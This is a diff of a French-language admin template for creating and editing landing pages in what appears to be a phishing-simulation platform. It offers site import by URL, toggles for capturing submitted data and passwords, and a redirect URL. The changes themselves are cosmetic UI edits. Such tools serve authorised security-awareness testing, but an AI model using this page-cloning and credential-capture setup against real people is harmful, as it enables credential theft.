@@ -29,8 +29,8 @@
             <tr data-id="{{ page.id }}">
                 <td>{{ page.name }}</td>
                 <td class="text-end">
-                    <button class="btn btn-primary btn-sm edit-landing-page" data-id="{{ page.id }}" data-bs-toggle="modal" data-bs-target="#editLandingPageModal">✏️ Modifier</button>
-                    <button class="btn btn-danger btn-sm delete-landing-page" data-id="{{ page.id }}">🗑️ Supprimer</button>
+                    <button class="btn btn-primary btn-sm edit-landing-page" data-id="{{ page.id }}" data-bs-toggle="modal" data-bs-target="#editLandingPageModal">Modifier</button>
+                    <button class="btn btn-danger btn-sm delete-landing-page" data-id="{{ page.id }}">Supprimer</button>
                 </td>
             </tr>
             {% endfor %}
@@ -48,13 +48,13 @@
             </div>
             <div class="modal-body">
                 <!-- Nom de la landing page -->
-                <label for="newLandingPageName" class="form-label">Nom :</label>
-                <input type="text" id="newLandingPageName" class="form-control mb-2" required>
+                <label for="newLandingPageName" class="form-label"><strong>Nom :</strong></label>
+                <input type="text" id="newLandingPageName" placeholder="Saisissez un nom pour cette page..." class="form-control mb-2" required>
 
                 <!-- Section Importer un site -->
                 <div class="border p-2 mb-3">
                     <h6 class="mb-2">Importer un site</h6>
-                    <label for="importSiteURL" class="form-label">URL du site :</label>
+                    <label for="importSiteURL" class="form-label"><strong>URL du site :</strong></label>
                     <input type="text" id="importSiteURL" class="form-control" placeholder="http://example.com">
                     <div class="form-check mt-2">
                         <input class="form-check-input" type="checkbox" id="includeResources">
@@ -66,17 +66,22 @@
                 </div>
 
                 <!-- Code HTML de la landing page -->
-                <label for="newLandingPageHTML" class="form-label">HTML :</label>
                 <div class="d-flex justify-content-between align-items-center mb-1">
+                    <label for="newLandingPageHTML" class="form-label"><strong>Aperçu / Code source</strong></label>
                     <!-- Le bouton bascule l'affichage entre le textarea et l'iframe de preview -->
-                    <button class="btn btn-secondary btn-sm" onclick="togglePreview('newLandingPageHTML', 'previewNewPageFrame')" type="button">Vue/Code</button>
+                    <div class="form-check form-switch">
+                        <label class="form-check-label" for="toggleViewSwitch">
+                            <input class="form-check-input" type="checkbox" id="toggleViewSwitch" onchange="togglePreview('newLandingPageHTML', 'previewNewPageFrame')">
+                            <span id="toggleLabel">Code</span> / <span>Vue</span>
+                        </label>
+                    </div>
                 </div>
-                <textarea id="newLandingPageHTML" class="form-control" rows="5" required></textarea>
+                <textarea id="newLandingPageHTML" placeholder="Tapez ici le contenu du message à envoyer..." class="form-control" rows="5" required></textarea>
                 <!-- Utilisation d'un iframe pour isoler le rendu -->
                 <iframe id="previewNewPageFrame" style="display:none; width:100%; height:300px; border:1px solid #ccc;"></iframe>
 
                 <!-- Options supplémentaires -->
-                <label class="form-label mt-2">Capture des données :</label>
+                <label class="form-label mt-2"><strong>Capture des données :</strong></label>
                 <div class="form-check">
                     <input class="form-check-input" type="checkbox" id="newCaptureCredentials" checked>
                     <label class="form-check-label" for="newCaptureCredentials">
@@ -84,7 +89,7 @@
                     </label>
                 </div>
 
-                <label class="form-label mt-2">Capture des mots de passe :</label>
+                <label class="form-label mt-2"><strong>Capture des mots de passe :</strong></label>
                 <div class="form-check">
                     <input class="form-check-input" type="checkbox" id="newCapturePasswords">
                     <label class="form-check-label" for="newCapturePasswords">
@@ -92,7 +97,7 @@
                     </label>
                 </div>
 
-                <label for="newRedirectUrl" class="form-label mt-2">URL de redirection :</label>
+                <label for="newRedirectUrl" class="form-label mt-2"><strong>URL de redirection :</strong></label>
                 <input type="text" id="newRedirectUrl" class="form-control" placeholder="http://example.com">
             </div>
             <div class="modal-footer">
@@ -113,31 +118,36 @@
             </div>
             <div class="modal-body">
                 <input type="hidden" id="editLandingPageId">
-                <label for="editLandingPageName" class="form-label">Nom :</label>
-                <input type="text" id="editLandingPageName" class="form-control mb-2" required>
-                <label for="editLandingPageHTML" class="form-label">HTML :</label>
+                <label for="editLandingPageName" class="form-label"><strong>Nom :</strong></label>
+                <input type="text" id="editLandingPageName" placeholder="Saisissez un nom pour cette page..." class="form-control mb-2" required>
                 <div class="d-flex justify-content-between align-items-center mb-1">
-                    <button class="btn btn-secondary btn-sm" onclick="togglePreview('editLandingPageHTML', 'previewEditPageFrame')" type="button">Vue/Code</button>
+                    <label for="editLandingPageHTML" class="form-label"><strong>Aperçu / Code source</strong></label>
+                    <div class="form-check form-switch">
+                        <label class="form-check-label" for="toggleViewSwitch">
+                            <input class="form-check-input" type="checkbox" id="toggleViewSwitch" onchange="togglePreview('editLandingPageHTML', 'previewEditPageFrame')">
+                            <span id="toggleLabel">Code</span> / <span>Vue</span>
+                        </label>
+                    </div>
                 </div>
-                <textarea id="editLandingPageHTML" class="form-control" rows="5" required></textarea>
+                <textarea id="editLandingPageHTML" placeholder="Tapez ici le contenu du message à envoyer..." class="form-control" rows="5" required></textarea>
                 <iframe id="previewEditPageFrame" style="display:none; width:100%; height:300px; border:1px solid #ccc;"></iframe>
                 
                 <!-- Options supplémentaires -->
-                <label class="form-label mt-2">Capture des données :</label>
+                <label class="form-label mt-2"><strong>Capture des données :</strong></label>
                 <div class="form-check">
                     <input class="form-check-input" type="checkbox" id="editCaptureCredentials" checked>
                     <label class="form-check-label" for="editCaptureCredentials">
                         Activer la capture des données
                     </label>
                 </div>
-                <label class="form-label mt-2">Capture des mots de passe :</label>
+                <label class="form-label mt-2"><strong>Capture des mots de passe :</strong></label>
                 <div class="form-check">
                     <input class="form-check-input" type="checkbox" id="editCapturePasswords">
                     <label class="form-check-label" for="editCapturePasswords">
                         Capturer également les mots de passe
                     </label>
                 </div>
-                <label for="editRedirectUrl" class="form-label mt-2">URL de redirection :</label>
+                <label for="editRedirectUrl" class="form-label mt-2"><strong>URL de redirection :</strong></label>
                 <input type="text" id="editRedirectUrl" class="form-control" placeholder="http://example.com">
             </div>
             <div class="modal-footer">
@@ -160,8 +170,8 @@ document.addEventListener("DOMContentLoaded", function() {
                     <tr data-id="${page.id}">
                         <td>${page.name}</td>
                         <td class="text-end">
-                            <button class="btn btn-primary btn-sm edit-landing-page" data-id="${page.id}" data-bs-toggle="modal" data-bs-target="#editLandingPageModal">✏️ Modifier</button>
-                            <button class="btn btn-danger btn-sm delete-landing-page" data-id="${page.id}">🗑️ Supprimer</button>
+                            <button class="btn btn-primary btn-sm edit-landing-page" data-id="${page.id}" data-bs-toggle="modal" data-bs-target="#editLandingPageModal">Modifier</button>
+                            <button class="btn btn-danger btn-sm delete-landing-page" data-id="${page.id}">Supprimer</button>
                         </td>
                     </tr>
                 `;
@@ -245,14 +255,15 @@ function togglePreview(textareaId, iframeId) {
     }
 }
 
+
 function validateLandingPageForm(nameId, htmlId) {
     const name = document.getElementById(nameId).value.trim();
     const html = document.getElementById(htmlId).value.trim();
 
     // Indiquer le nom des champs requis
     const isValidRequiredFields = validateRequiredFields([
-        [name, "Nom Page de destination"],
-        [html, "Contenu HTML"]
+        [name, "Nom de la page"],
+        [html, "Contenu vide"]
     ]);
 
     if (!isValidRequiredFields) return;
